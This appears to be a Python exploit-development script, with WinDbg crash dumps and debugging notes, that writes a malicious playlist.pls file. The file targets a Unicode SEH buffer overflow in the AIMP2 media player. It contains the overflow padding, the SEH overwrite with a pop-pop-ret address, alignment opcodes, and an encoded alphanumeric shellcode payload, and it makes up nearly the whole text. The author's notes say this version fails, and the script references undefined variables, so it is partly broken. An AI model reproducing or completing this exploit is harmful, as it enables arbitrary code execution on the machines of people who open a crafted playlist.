eax=00000000 ebx=00000000 ecx=77728a22 edx=77728a41 esi=00000000 edi=00000000
eip=0019fccc esp=0019c334 ebp=0019c42c iopl=0         nv up ei ng nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
0019fccc b700            mov     bh,0
"""

padding = "A" * 4058

nseh = "\x42\x6d"
seh  = "\x7a\xb7" # pop-pop-ret, obtain from AIMP2.dll but rebase is TRUE somehow so need to keep changing

# take 0x00bX007a |   0x00b8007a (b+0x000e007a)  : pop ecx # pop ebp # ret  | startnull,unicode {PAGE_EXECUTE_READWRITE} [AIMP2.dll] ASLR: False, Rebase: True, SafeSEH: False, OS: False, v2.5.1.330 (C:\Program Files (x86)\AIMP2\AIMP2.dll)
# if b8, bb, then padd it with 2 \x6d
# if b3, then its okay
# if b0, b1, b2, b4, b6, b7
# if ad cannot, c1 also cannot
# if 9d pad with 6d


# Put a valid address from the stack into EAX (4th address on esp, so pop it to eax)
align = "\x58" # pop eax
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align
align += "\x58" # pop eax
align += "\x6d" # nop/align

# Decrement EAX to point almost to the beginning of the buffer, as there is not enough space to fit in shellcode
align += "\x05\x01\x11" # add eax,11000100       0500010011
align += "\x6d"         # nop/align              006d00
align += "\x2d\x20\x11" # sub eax,11002000       2d00200011
align += "\x6d"         # nop/align

# Adjust EAX to point precisely to the beginning of the buffer
# NOTE: At this point EAX is 0x7a bytes short of the target.
# -0x7a negative complement is equivalent to 0x86.
# Unfortunately 0x86 can not be used since it is converted to 
# 0x2020 instead of the expected 0x8600, so we need to build it
# by adding 0x43 to itself.

# Jump to future shellcode location
jump = "\x50" # push eax
jump += "\x6d" # nop/align
jump += "\xc3" # ret

"""
0:000> d eax-b6
0019dd12  5c 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  \.A.A.A.A.A.A.A.
0019dd22  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0019dd32  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0019dd42  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0019dd52  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0019dd62  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0019dd72  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0019dd82  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.
0:000> d eax-b5
0019dd13  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd23  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd33  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd43  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd53  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd63  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd73  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
0019dd83  00 41 00 41 00 41 00 41-00 41 00 41 00 41 00 41  .A.A.A.A.A.A.A.A
"""

"""
dd 0019ddc8 - b5 0x75
0019ddc8
dd 0019ddc8 + b5 0xCC
"""

__buffer = "A" * 90
padding_length = 4058
shellcode = ("PPYAIAIAIAIAQATAXAZAPA3QADAZA"
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA"
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB"
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K"
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL"
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55"
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V"
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB"
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT"
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU"
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM"
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC"
"QQ2LRCM0LJA")
padding = __buffer + shellcode + "\x75" * (padding_length - len(__buffer + shellcode))

rest = "D" * (totalsize - len(padding + nseh + seh))
__payload = header + padding + nseh + seh + align + jump + rest

f = open('playlist.pls','w')
f.write(__payload)
f.close()


# dd, d, db

# !py mona seh -m aimp2.dll -cp unicode

# db 0019ddc8 - b4

"""
(3c40.2bcc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files (x86)\AIMP2\AIMP2.dll
eax=08f70020 ebx=00000000 ecx=00000227 edx=00000c2c esi=08f78a50 edi=001a0000
eip=00a330c6 esp=0019dbd0 ebp=0019dc8c iopl=0         nv up ei pl nz ac po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010212
AIMP2!SysutilsWideFormatBuf$qqrpvuipxvuipx14SystemTVarRecxi+0xe2:
00a330c6 f366a5          rep movs word ptr es:[edi],word ptr [esi]
0:000> g
(3c40.2bcc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41003800 ebx=00000000 ecx=0019d79e edx=0019d79b esi=00000000 edi=00000000
eip=0019df92 esp=0019d698 ebp=0019d6a0 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
0019df92 3300            xor     eax,dword ptr [eax]  ds:002b:41003800=????????
0:000> db 0019df92 
0019df92  33 00 30 00 41 00 50 00-42 00 39 00 34 00 34 00  3.0.A.P.B.9.4.4.
0019dfa2  4a 00 42 00 4b 00 4c 00-4b 00 38 00 55 00 39 00  J.B.K.L.K.8.U.9.
0019dfb2  4d 00 30 00 4d 00 30 00-4b 00 50 00 53 00 30 00  M.0.M.0.K.P.S.0.
0019dfc2  55 00 39 00 39 00 55 00-4e 00 51 00 38 00 52 00  U.9.9.U.N.Q.8.R.
0019dfd2  53 00 34 00 34 00 4b 00-50 00 52 00 30 00 30 00  S.4.4.K.P.R.0.0.
0019dfe2  34 00 4b 00 32 00 32 00-4c 00 4c 00 44 00 4b 00  4.K.2.2.L.L.D.K.
0019dff2  52 00 32 00 4d 00 44 00-34 00 4b 00 43 00 42 00  R.2.M.D.4.K.C.B.
0019e002  4d 00 58 00 4c 00 4f 00-47 00 47 00 30 00 4a 00  M.X.L.O.G.G.0.J.

1. aimp2.dll rebase is True, so address keep changing, only some can work
2. Reason why this will not work is that, the register that you are using (EAX) must DIRECTLY point at the 
start of your shellcode, cannot use nops as padding before your shellcode. If you use nops, then you will
observe the above error in windbg
"""

